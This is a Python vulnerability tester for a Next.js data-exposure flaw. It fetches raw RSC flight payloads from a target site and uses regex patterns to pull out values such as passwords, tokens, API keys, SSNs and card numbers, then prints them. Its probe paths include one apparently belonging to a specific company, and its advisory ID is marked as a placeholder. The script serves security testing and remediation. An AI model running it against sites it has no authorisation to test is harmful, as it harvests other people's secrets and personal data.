#!/usr/bin/env python3
"""
CVE-2025-48068 — Next.js Sensitive Data Exposure via RSC Payload
================================================================

CVE ID      : CVE-2025-48068
GHSA        : GHSA-4w4h-9rp2-p7jq (placeholder — verify at time of use)
CVSS Score  : 4.3 (MEDIUM)
CVSS Vector : CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N
Affected    : Next.js >= 13.0.0, < 14.2.30 (App Router RSC)
Patched     : 14.2.30
Published   : 2025-05 (est.)

Description
-----------
React Server Components (RSC) in Next.js App Router serialize server-side
data into a "flight" payload that is sent to the client for hydration.
Under certain conditions, this payload may include data from Server Component
props or context that the developer did not intend to expose to the client.

Specifically, when a Server Component receives sensitive data (e.g., from a
database query) and passes it to a Client Component, all props passed at
the Server→Client boundary are serialized into the RSC payload and sent
in plaintext to the browser. If a developer passes sensitive fields (e.g.,
password hashes, internal IDs, private configuration) without stripping them,
this data is visible in the RSC wire format.

Additionally, in affected versions, certain internal Next.js metadata that
should not be serialized may appear in the flight payload.

Attack Surface
--------------
- App Router applications with Server Components passing full database
  objects to Client Components
- Applications where server-side data models are not sanitized before
  crossing the Server→Client boundary
- Endpoints accessible via the RSC protocol (?_rsc= or _next/data)

Test Methodology
---------------
1. Detect App Router (/_next/static/chunks/app/ chunks).
2. Request pages with RSC-specific headers to receive the raw flight payload.
3. Inspect the payload for potentially sensitive field names (password, token,
   secret, hash, key, internal, private).
4. Compare RSC payload against rendered HTML to find fields present in RSC
   but not visible in the UI.

Remediation
-----------
Upgrade Next.js to >= 14.2.30.
Always sanitize data at the Server→Client component boundary:
  - Pass only the fields that Client Components need
  - Use TypeScript to define strict prop types at the boundary
  - Consider using a DTO (Data Transfer Object) pattern

References
----------
- https://nvd.nist.gov/vuln/detail/CVE-2025-48068
"""

from __future__ import annotations

import argparse
import re
import urllib.error
import urllib.request

SENSITIVE_FIELD_PATTERNS = [
    r'"password":\s*"[^"]+"',
    r'"passwordHash":\s*"[^"]+"',
    r'"secret":\s*"[^"]+"',
    r'"token":\s*"[^"]+"',
    r'"apiKey":\s*"[^"]+"',
    r'"api_key":\s*"[^"]+"',
    r'"privateKey":\s*"[^"]+"',
    r'"ssn":\s*"[^"]+"',
    r'"creditCard":\s*"[^"]+"',
    r'"internalId":\s*"[^"]+"',
]


def fetch(url: str, headers: dict[str, str] | None = None, timeout: int = 10) -> tuple[int, str, dict]:
    h = {"User-Agent": "NextJS-CVE-Tester/1.0", "Accept": "text/x-component,*/*"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read(131072).decode("utf-8", errors="replace")
            resp_headers = {k.lower(): v for k, v in resp.headers.items()}
            return resp.status, body, resp_headers
    except urllib.error.HTTPError as exc:
        body = exc.read(4096).decode("utf-8", errors="replace") if exc.fp else ""
        resp_headers = {k.lower(): v for k, v in exc.headers.items()} if exc.headers else {}
        return exc.code, body, resp_headers
    except urllib.error.URLError as exc:
        raise ConnectionError(str(exc)) from exc


def is_app_router(body: str) -> bool:
    return bool(re.search(r'/_next/static/chunks/app/', body) or "__RSC_MANIFEST" in body)


def fetch_rsc_payload(target: str, path: str, timeout: int) -> tuple[int, str, str]:
    """Request the RSC flight payload for a given path.

    Tries two methods:
    1. ?_rsc=<nonce> query parameter (browser protocol — avoids full HTML render)
    2. RSC: 1 header (alternative protocol)

    Returns (status, body, method_used).
    """
    import random
    import string
    nonce = "".join(random.choices(string.ascii_letters + string.digits + "-_", k=22))

    # Method 1: _rsc query param (matches what browser DevTools shows)
    rsc_url = f"{target.rstrip('/')}{path}?_rsc={nonce}"
    status, body, resp_headers = fetch(
        rsc_url,
        headers={
            "Accept": "text/x-component",
            "Next-Router-State-Tree": "%5B%22%22%2C%7B%7D%2Cnull%2Cnull%2Ctrue%5D",
            "Next-Router-Prefetch": "1",
            "RSC": "1",
        },
        timeout=timeout,
    )
    content_type = resp_headers.get("content-type", "")
    if "text/x-component" in content_type or (status == 200 and body.startswith(("0:", "1:", "2:"))):
        return status, body, f"_rsc param ({rsc_url})"

    # Method 2: RSC header only (no query param)
    status2, body2, _ = fetch(
        f"{target.rstrip('/')}{path}",
        headers={"RSC": "1", "Next-Router-State-Tree": "[]", "Accept": "text/x-component"},
        timeout=timeout,
    )
    return status2, body2, "RSC header"


def decode_rsc_lines(payload: str) -> list[str]:
    """Extract readable strings from RSC flight wire format.

    RSC wire format looks like:
      0:["$L1",["$","html",...]]
      1:{"id":"...","chunks":[...],...}
      2:I["path/to/component",[...]]
    Each line is: <row_id>:<type_tag><json_or_value>
    """
    lines = []
    for line in payload.splitlines():
        colon = line.find(":")
        if colon == -1:
            continue
        content = line[colon + 1:]
        lines.append(content)
    return lines


def run(target: str, timeout: int, verbose: bool) -> int:
    print(f"\n[CVE-2025-48068] Next.js RSC Sensitive Data Exposure")
    print(f"Target : {target}")
    print("-" * 60)

    try:
        _, body, _ = fetch(target, timeout=timeout)
    except ConnectionError as exc:
        print(f"  Connection error: {exc}")
        print("\nVERDICT : INCONCLUSIVE")
        return 2

    if not is_app_router(body):
        print("  App Router not detected.")
        print("\nVERDICT : NOT APPLICABLE")
        return 0

    print("  App Router detected. Fetching RSC payloads...")

    # Include /my-amc (AMC's user account/profile route) plus generic paths
    probe_paths = ["/", "/my-amc", "/account", "/profile", "/dashboard", "/api/user"]
    sensitive_found: list[tuple[str, str]] = []

    for path in probe_paths:
        try:
            rsc_status, rsc_body, rsc_method = fetch_rsc_payload(target, path, timeout)
        except ConnectionError as exc:
            if verbose:
                print(f"  RSC {path}: connection error ({exc})")
            continue

        is_rsc = rsc_body.startswith(("0:", "1:", "2:")) or "text/x-component" in rsc_method
        if verbose or is_rsc:
            preview = rsc_body[:300].replace("\n", " ")
            print(f"  RSC {path}  status={rsc_status}  via={rsc_method.split('(')[0].strip()}")
            print(f"    payload: {preview!r}")

        for pattern in SENSITIVE_FIELD_PATTERNS:
            matches = re.findall(pattern, rsc_body)
            for match in matches:
                sensitive_found.append((path, match[:80]))

    print()
    if sensitive_found:
        print("VERDICT : LIKELY VULNERABLE — Sensitive fields in RSC payload")
        print()
        print("Sensitive-looking fields found in RSC flight data:")
        for path, match in sensitive_found:
            print(f"  {path}: {match}")
        print()
        print("These fields are visible to any client that requests the RSC payload.")
        print("Fix: Upgrade to >= 14.2.30 AND sanitize props at Server→Client boundary.")
        return 1
    else:
        print("VERDICT : NO SENSITIVE FIELDS DETECTED")
        print()
        print("No sensitive field names found in RSC payloads for tested paths.")
        print("This does not guarantee safety — application-specific sensitive fields")
        print("may require manual inspection of the RSC wire format.")
        return 0


def main() -> int:
    parser = argparse.ArgumentParser(description="Test CVE-2025-48068 Next.js RSC data exposure")
    parser.add_argument("--target", default="http://localhost:3000")
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--verbose", "-v", action="store_true")
    args = parser.parse_args()
    return run(args.target, args.timeout, args.verbose)


if __name__ == "__main__":
    raise SystemExit(main())
